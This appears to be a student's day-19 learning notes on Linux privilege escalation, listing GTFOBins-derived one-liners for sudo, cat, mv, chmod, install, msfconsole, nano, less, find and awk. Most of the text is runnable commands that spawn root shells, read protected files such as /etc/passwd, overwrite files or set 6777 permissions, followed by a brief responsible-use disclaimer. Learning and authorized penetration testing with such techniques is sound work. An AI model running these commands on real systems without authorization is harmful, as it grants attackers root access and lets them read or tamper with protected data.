# Day-19: Escalating Privileges with Common Commands

On this day, we learned various methods to gain root access without knowing the root password by leveraging common commands and their configurations.

[The website to get crack sudo](https://gtfobins.github.io/gtfobins/nano/)

### Here are some of the techniques we covered:

### 1. `sudo`
**Description:**
If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

**Command:**
```sh
sudo sudo /bin/sh
```

### 2. `cat`
**Description:**
The `cat` command reads data from files and can be used to do privileged reads or disclose files outside a restricted file system. If it has the SUID bit set, it can escalate privileges.

**Commands:**
- File Read:
  ```sh
  LFILE=file_to_read
  cat "$LFILE"
  ```
- SUID:
  ```sh
  sudo install -m =xs $(which cat) .
  
  LFILE=file_to_read
  ./cat "$LFILE"
  ```
- Sudo:
  ```sh
  LFILE=file_to_read
  sudo cat "$LFILE"
  ```

### 3. `mv`
**Description:**
The `mv` command can move files from restricted file systems or with elevated privileges. If it has the SUID bit set, it can escalate privileges.

**Commands:**
- SUID:
  ```sh
  sudo install -m =xs $(which mv) .
  
  LFILE=file_to_write
  TF=$(mktemp)
  echo "DATA" > $TF
  ./mv $TF $LFILE
  ```
- Sudo:
  ```sh
  LFILE=file_to_write
  TF=$(mktemp)
  echo "DATA" > $TF
  sudo mv $TF $LFILE
  ```

### 4. `chmod`
**Description:**
The `chmod` command can change file permissions with elevated privileges. If it has the SUID bit set, it can escalate privileges.

**Commands:**
- SUID:
  ```sh
  sudo install -m =xs $(which chmod) .
  
  LFILE=file_to_change
  ./chmod 6777 $LFILE
  ```
- Sudo:
  ```sh
  LFILE=file_to_change
  sudo chmod 6777 $LFILE
  ```

### 5. `install`
**Description:**
The `install` command can change permissions and execute a copy of the file with elevated privileges. If it has the SUID bit set, it can escalate privileges.

**Commands:**
- SUID:
  ```sh
  sudo install -m =xs $(which install) .
  
  LFILE=file_to_change
  TF=$(mktemp)
  ./install -m 6777 $LFILE $TF
  ```
- Sudo:
  ```sh
  LFILE=file_to_change
  TF=$(mktemp)
  sudo install -m 6777 $LFILE $TF
  ```

### 6. `msfconsole`
**Description:**
The `msfconsole` can spawn a Ruby interpreter to break out of restricted environments and escalate privileges.

**Commands:**
- Shell:
  ```sh
  sudo msfconsole
  msf6 > irb
  >> system("/bin/sh")
  ```
- Sudo:
  ```sh
  sudo msfconsole
  msf6 > irb
  >> system("/bin/sh")
  ```

### 7. `nano`
**Description:**
The `nano` text editor can be exploited to spawn a shell with elevated privileges if allowed to run as superuser.

**Commands:**
- Sudo:
  ```sh
  sudo nano
  ```
  - In nano, press `Ctrl+R` then `Ctrl+X`, then type:
  ```sh
  reset; sh 1>&0 2>&0
  ```

### 8. `less`
**Description:**
The `less` command can be used to read files with elevated privileges and can also spawn a shell.

**Commands:**
- Sudo:
  ```sh
  sudo less /etc/passwd
  ```
  - In less, type:
  ```sh
  !/bin/sh
  ```

### 9. `find`
**Description:**
The `find` command can be used to search for files with elevated privileges and can be abused to spawn a shell.

**Commands:**
- SUID:
  ```sh
  sudo install -m =xs $(which find) .
  ./find . -exec /bin/sh \;
  ```
- Sudo:
  ```sh
  sudo find . -exec /bin/sh \;
  ```

### 10. `awk`
**Description:**
The `awk` command is a powerful text-processing tool that can be exploited to spawn a shell with elevated privileges.

**Commands:**
- SUID:
  ```sh
  sudo install -m =xs $(which awk) .
  ./awk 'BEGIN {system("/bin/sh")}'
  ```
- Sudo:
  ```sh
  sudo awk 'BEGIN {system("/bin/sh")}'
  ```

---

This guide showcases various ways to escalate privileges using common commands. Each method should be used responsibly and only on systems where you have explicit permission to conduct security testing.
